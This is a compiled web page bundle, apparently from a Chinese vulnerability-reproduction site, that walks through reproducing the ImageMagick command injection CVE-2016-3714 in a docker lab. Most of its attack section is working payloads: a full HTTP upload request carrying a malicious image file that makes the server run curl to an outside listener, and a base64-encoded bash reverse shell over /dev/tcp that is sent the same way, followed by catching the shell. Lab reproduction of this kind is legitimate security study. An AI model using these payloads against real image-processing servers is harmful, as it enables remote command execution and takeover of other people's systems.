import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r,o,c as s,a as e,b as i,d as a,e as l}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),p=e("p",null,"ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。",-1),u=e("p",null,"参考链接：",-1),m={href:"https://imagetragick.com/",target:"_blank",rel:"noopener noreferrer"},g={href:"https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/ImageTragick/PoCs",target:"_blank",rel:"noopener noreferrer"},h=l(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动一个包含了Imagemagick 6.9.2-10的PHP服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问<code>http://your-ip:8080/</code>即可查看到一个上传组件。</p><p>发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST / HTTP/1.1
Host: your-ip:8080
Content-Length: 321
Origin: http://your-ip:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGqvKmZLh7bp9gMc1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8


------WebKitFormBoundaryGqvKmZLh7bp9gMc1
Content-Disposition: form-data; name=&quot;file_upload&quot;; filename=&quot;avatar.jpg&quot;
Content-Type: image/jpeg

push graphic-context
viewbox 0 0 640 480
fill &#39;url(https://127.0.0.0/oops.jpg&quot;|curl &quot;www.your-domain.cn:2333)&#39;
pop graphic-context
------WebKitFormBoundaryGqvKmZLh7bp9gMc1--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241129569.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><code>www.your-domain.cn</code>监听2333端口。可见，2333端口已经接收到http请求，说明curl命令执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241131681.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>反弹shell（只能使用<code>/bin/bash</code>反弹，不能使用<code>bash</code>反弹）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>push graphic-context
viewbox 0 0 640 480
fill &#39;url(https://127.0.0.0/oops.jpg?\`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjQzLjIzNy42MS8yMzMzIDA+JjEK | base64 -d | bash\`&quot;||id &quot; )&#39;
pop graphic-context
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>监听2333端口，接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241148867.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14);function b(_,f){const n=r("ExternalLinkIcon");return o(),s("div",null,[c,p,u,e("ul",null,[e("li",null,[e("a",m,[i("https://imagetragick.com"),a(n)])]),e("li",null,[e("a",g,[i("https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html"),a(n)])]),e("li",null,[e("a",v,[i("https://github.com/ImageTragick/PoCs"),a(n)])])]),h])}const w=t(d,[["render",b],["__file","ImageMagick 命令执行漏洞 CVE-2016–3714.html.vue"]]);export{w as default};
